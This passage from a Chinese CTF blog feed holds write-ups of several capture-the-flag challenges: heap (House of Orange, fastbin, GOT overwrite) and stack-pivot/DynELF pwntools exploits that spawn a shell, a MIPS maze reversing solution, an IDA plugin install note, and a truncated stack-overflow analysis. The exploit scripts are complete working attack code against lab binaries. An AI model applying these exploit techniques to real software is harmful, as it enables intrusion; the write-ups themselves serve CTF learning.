class="hljs-string">'/ctf/work/ciscn2020/pwn/nofree/pwn'</span>    Arch:     amd64<span class="hljs-number">-64</span>-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><p>可以看到保护开的还是很少的，然后no free 明显需要使用到hos of orange进行攻击了。</p><h5 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h5><ul><li>只能申请0-0x90大小的堆块，堆块号自定义0-2，且由于没有对已经存在的堆块号验证，可以进行无限次的申请同一个序号的堆块。</li><li>堆块地址存在于<code>0x06020C0  + 0x100</code> size 跟在后面。</li><li><code>strdup</code> 相当于<code>malloc(stren(s))</code> </li></ul><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><ul><li>倘若输入没有存在的堆块idx，程序会直接返回</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>难点基本就在泄漏libc了。</p><ul><li>利用程序的堆溢出漏洞，修改一下top chunk</li><li>申请多次0号0x90的堆块，来消耗修改后的top chunk，到达一定程度后进行hos of orange攻击，获取一个空闲的进入fastbin的堆块</li><li>利用堆溢出，在fastbin chain上加一个<code>0x06020C0  + 0x100</code> ，准备进行fastbin attack，来获取一个在存放堆块地址的堆块，这样就实现了任意地址写。</li><li>修改<code>atoi</code> 的got 表为 printf，创造出一个格式化字符串漏洞</li><li>利用add中的atoi，完成格式化字符串漏洞的利用，泄漏出libc地址</li><li>利用格式化字符串漏洞，修改<code>atoi</code> 的got表为<code>elf.plt[&#39;atoi&#39;] + 6</code> ，让其完成一下解析，重新构造出正常的atoi（原因：测速中发现，用edit功能输入idx后直接退出，只能让其恢复正常，再进行任意地址写）</li><li>修改<code>atoi</code> 的got为system的地址，然后在发送个<code>sh</code> ，完成<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">"content"</span>,str(data))payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xfb1</span>)edit(<span class="hljs-number">0</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x90</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x10</span>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,payload)payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x70</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x6020C0</span> + <span class="hljs-number">0x100</span>)edit(<span class="hljs-number">1</span>,payload)payload = <span class="hljs-number">0x60</span> * <span class="hljs-string">'a'</span>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x70</span>,payload)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,payload)payload = p64(<span class="hljs-number">0x0000000000602058</span>) + p64(<span class="hljs-number">0x90</span>)edit(<span class="hljs-number">0</span>,payload)edit(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%82c'</span> + <span class="hljs-string">'%8$hhn11'</span> + p64(<span class="hljs-number">0x000000000602058</span>)sa(<span class="hljs-string">'idx'</span>,payload)edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安恒HWS夏令营选拔赛部分题目</title>
    <link href="/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/"/>
    <url>/2020/08/16/%E6%97%A0%E6%A0%87%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="安恒HWS夏令营选拔赛部分题目"><a href="#安恒HWS夏令营选拔赛部分题目" class="headerlink" title="安恒HWS夏令营选拔赛部分题目"></a>安恒HWS夏令营选拔赛部分题目</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="IOT1"><a href="#IOT1" class="headerlink" title="IOT1"></a>IOT1</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考：<br><a href="https://www.cnblogs.com/csnd/p/11800622.html" target="_blank" rel="noopener">https://www.cnblogs.com/csnd/p/11800622.html</a></p><p>注意网卡那块，要对应自己虚拟机网卡的情况。</p><h5 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h5><div class="hljs"><pre><code class="hljs python">qemu-system-mipsel -M malta -hda openwrt-malta-le-root.ext4 -kernel openwrt-malta-le-vmlinux.elf -nographic -append <span class="hljs-string">"root=/dev/sda console=tty50"</span>  -net nic -net tap</code></pre></div><h4 id="把虚拟机中要分析的maze文件取出来"><a href="#把虚拟机中要分析的maze文件取出来" class="headerlink" title="把虚拟机中要分析的maze文件取出来"></a>把虚拟机中要分析的maze文件取出来</h4><div class="hljs"><pre><code class="hljs bash">scp -r /path/maze username@servername:/path</code></pre></div><h4 id="使用ghidra进行分析"><a href="#使用ghidra进行分析" class="headerlink" title="使用ghidra进行分析"></a>使用ghidra进行分析</h4><div class="hljs"><pre><code class="hljs bash">fgets(buf,0x28,_stdin);len = strlen(buf);uStack68 = 0x20;<span class="hljs-keyword">if</span> (*(char *)((int)&amp;uStack68 + len + 3) == <span class="hljs-string">'\n'</span>) &#123;  *(undefined *)((int)&amp;uStack68 + len + 3) = 0;  len = len - 1;&#125;<span class="hljs-keyword">if</span> (len != 0x20) &#123;  eorr();&#125;</code></pre></div><p>这一段可以确定让输入的是32个字符。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004006f0</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;  <span class="hljs-keyword">int</span> i;  <span class="hljs-keyword">int</span> j;    i = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (i &lt; DAT_16) &#123;    j = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (j &lt; <span class="hljs-number">8</span>) &#123;      maze[i * <span class="hljs-number">8</span> + j] =           (<span class="hljs-keyword">char</span>)(((<span class="hljs-keyword">int</span>)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * <span class="hljs-number">4</span>)) &gt;&gt;                 (<span class="hljs-number">7U</span> - j &amp; <span class="hljs-number">0x1f</span>));      j = j + <span class="hljs-number">1</span>;    &#125;    i = i + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre></div><p>可以看到迷宫是在运行时根据部分数据，来生成的。并且其中一行是8个数据，一列是16个，一共128个数据。</p><p>可以使用gdb，断点在这个函数之后，把迷宫提取出来。提取出来的都是0x1 和 0x0<br>组成的迷宫。</p><p>进入控制走位的函数：</p><div class="hljs"><pre><code class="hljs c">heng = <span class="hljs-number">1</span>;shu = <span class="hljs-number">0</span>;pcStackX0 = param_1</code></pre></div><p>这个地方控制说，起先起点是第1行的第2个位置。</p><p>check函数，主要是看你是不是在移动后，走到了0上，走到的话，程序就判你失败。</p><p>往下看，发现主要判断：</p><div class="hljs"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (cVar1 != <span class="hljs-string">'U'</span>) &#123;LAB_00400ad4:            <span class="hljs-keyword">if</span> ((heng == <span class="hljs-number">1</span>) &amp;&amp; (shu == <span class="hljs-number">10</span>)) &#123;              uVar3 = <span class="hljs-number">1</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              uVar3 = <span class="hljs-number">0</span>;            &#125;</code></pre></div><p>在这一段，可以确定走到第11列的第2个数字即可。</p><h4 id="提取迷宫图并处理"><a href="#提取迷宫图并处理" class="headerlink" title="提取迷宫图并处理"></a>提取迷宫图并处理</h4><h5 id="脚本提取"><a href="#脚本提取" class="headerlink" title="脚本提取"></a>脚本提取</h5><div class="hljs"><pre><code class="hljs c">data=<span class="hljs-string">"AMz1nG~#--Ma7e~"</span>data2=[<span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x1</span>]maze=[]lie=<span class="hljs-number">0</span><span class="hljs-keyword">while</span> lie&lt;<span class="hljs-number">15</span>:    hang=<span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> hang&lt;<span class="hljs-number">8</span>:        # print(hex(ord(data[lie])&amp;data2[hang]),(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        hang+=<span class="hljs-number">1</span>    lie+=<span class="hljs-number">1</span>print(maze)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>就这迷宫，我看了好一会才能走好。🤣🤣服了自己，老以为是数据提取错了。</p><div class="hljs"><pre><code class="hljs bash">flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125;</code></pre></div><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h5><ul><li>格式化字符串漏洞，可以用来泄漏。</li><li>栈溢出，只能1个gadget。</li></ul><h5 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h5><h6 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h6><p>只能溢出一个gadget，肯定是打栈迁移，但是跟以往的栈迁移不同的是，这一个gadget只能溢出到rbp，并不能覆盖到ret address，所以只能覆盖好rbp后，利用程序走出这个函数后，将要结束程序时的<code>leave ret</code> 。</p><p>但是需要注意的是因为在走过一次 <code>leave ret</code>时，此时的rbp已经被改了，再过程序的第二个leave ret 前，需要过一下canary的检测:</p><div class="hljs"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (<span class="hljs-string">'8'</span>)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (<span class="hljs-string">'x'</span>)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre></div><p>看这里，在取数值时，其在你迁移的bss段读取数值到rdx进行判断的，所以在第一次往bss段读的时候，填充好canary的值。</p><p>并且这个题，在看got表到bss段的距离也是很近的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>所以在迁移的时候需要注意，从有实际意义的函数（比如puts）开始前就得把栈抬高。否则在进入libc的内部调用函数时，会因为各种push pop 而修改到got处的东西，导致不仅泄漏的数值有问题，并且容易让程序崩掉。</p><div class="hljs"><pre><code class="hljs bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(6).ljust(8,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()</code></pre></div><p>此处就可以泄漏出puts函数的libc地址，但是由于出题人想考察<code>ret2dl_runtime_resolve</code>,所以应该是魔改了libc。</p><p>然后可以使用DynELF来搞定，参考群里师傅分享的exp。</p><h6 id="Dynelf函数怎么写"><a href="#Dynelf函数怎么写" class="headerlink" title="Dynelf函数怎么写"></a>Dynelf函数怎么写</h6><p>由于程序只有puts函数来输出，就用puts函数来进行泄漏。</p><div class="hljs"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">57</span> +p64(canary) * <span class="hljs-number">2</span>  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre></div><p>本来我是这样写的，但是发现程序还是会崩，由于程序情况的限制，栈只能提高<code>0x1b0</code>这样，还是不够用。</p><p>还是就想办法提升栈，往高点的bss上写入rop进行想要的操作。</p><p>这个就在Dynelf前写好,用rop控制参数，调用read函数来往高点的bss段进行写payload，并且最后用pop rsp的操作，把写好rop chain的bss的地址pop 到rsp上，然后再ret上去：</p><div class="hljs"><pre><code class="hljs python">payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()</code></pre></div><p>接着就是用这写好好的rop chain，进行泄漏地址，为了Dynelf多次调用泄漏，在泄漏地址后，跟上read函数继续往这段地址上读取同样的rop chain，然后再次控制rsp，接着ret到对应的位置：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> data</code></pre></div><p>可以看到是提高了0x500个字节的地方进行rop，做好用控制rsp，ret后进行反复横跳跃，完成对system 的寻找。感觉这是很好的办法，因为栈迁移的核心还是控制rsp，最初学习是见过2次栈迁移的题目，当时用的还是leave ret 来进行的控制，现在看到直接使用pop rsp 来控制，的确是方便又简单的办法。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment"># from LibcSearcher import *</span>s = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-comment"># s = remote("183.129.189.61",54900)</span>libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)elf = ELF(<span class="hljs-string">"./pwn"</span>)context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(s)[0],gdbscript='b main')</span>    gdb.attach(s)    pause()pop_rdi = <span class="hljs-number">0x0000000000400963</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000400961</span>pop_rsp_3 = <span class="hljs-number">0x000000000040095d</span>leave_ret = <span class="hljs-number">0x00000000004007dc</span>context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]puts_got = elf.got[<span class="hljs-string">'puts'</span>]read_plt = elf.plt[<span class="hljs-string">'read'</span>]bss = <span class="hljs-number">0x6010a0</span>s.sendafter(<span class="hljs-string">"canary ' s @ # $ % ^ &amp; * :\n"</span>, <span class="hljs-string">"%9$p"</span>)canary = int(s.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>)success(hex(canary))context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> datadebug()payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)success(hex(system))payload = p64(pop_rdi)+p64(<span class="hljs-number">0x6010a0</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>*<span class="hljs-number">11</span>)+p64(system)s.send(payload)s.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOS安装IDA插件keypatch</title>
    <link href="/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <url>/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/</url>
    
    <content type="html"><![CDATA[<h1 id="MacOS安装IDA插件keypatch"><a href="#MacOS安装IDA插件keypatch" class="headerlink" title="MacOS安装IDA插件keypatch"></a>MacOS安装IDA插件keypatch</h1><p>macOS 安装官方介绍的安装方式不太行。网上参考后记录一下。</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><div class="hljs"><pre><code class="hljs bash">brew install cmake</code></pre></div><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/fjh658/keystone-engine.git<span class="hljs-built_in">cd</span> keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre></div><p>此时在安装后的最后几段代码中，找到类似：</p><div class="hljs"><pre><code class="hljs bash">/Library/Python/2.7/site-packages/keystone</code></pre></div><p>这是本地python2.7的路径。</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><div class="hljs"><pre><code class="hljs bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre></div><p>现实拒绝的话，可以</p><div class="hljs"><pre><code class="hljs bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre></div><div class="hljs"><pre><code class="hljs bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre></div><p>然后进入ida使用即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂项</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF安恒月赛(7th)</title>
    <link href="/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <url>/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTF安恒月赛-7th"><a href="#DASCTF安恒月赛-7th" class="headerlink" title="DASCTF安恒月赛(7th)"></a>DASCTF安恒月赛(7th)</h1><p>只做出个签到题，tcl。。。</p><h2 id="虚假的签到题"><a href="#虚假的签到题" class="headerlink" title="虚假的签到题"></a>虚假的签到题</h2><p>简单的栈溢出，但是出题人估计是用了GCC&gt;=4.9版本，故意给这个Stack Buffer Overflow 设置难度。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x80485fd</span> &lt;main+<span class="hljs-number">104</span>&gt;:        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048600</span> &lt;main+<span class="hljs-number">107</span>&gt;:        <span class="hljs-keyword">leave</span><span class="hljs-number">0x8048601</span> &lt;main+<span class="hljs-number">108</span>&gt;:        <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ecx</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048604</span> &lt;main+<span class="hljs-number">111</span>&gt;:        <span class="hljs-keyword">ret</span></code></pre></div><p>这里我们可以看到，程序在对栈的保存上，额外使用了 ecx 来保存栈上的某个值。并且调试可以发现，如果我们直接overflow了 esp，那么会造成奇怪的影响。</p><p>试着分析一下：</p><ul><li>想要控制esp，就得控制ecx</li><li>想要控制ecx，就得至少控制到ebp-0x4的位置</li></ul><p>由于是gets的获取输入，这个明显很容易实现。</p><p>核心就是让：</p><div class="hljs"><pre><code class="hljs undefined">[ [ebp<span class="hljs-number">-0x4</span>] - <span class="hljs-number">0x4</span>] = address(backdoor)</code></pre></div><p>附上成功时栈情况,断点在0x80485fd ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" 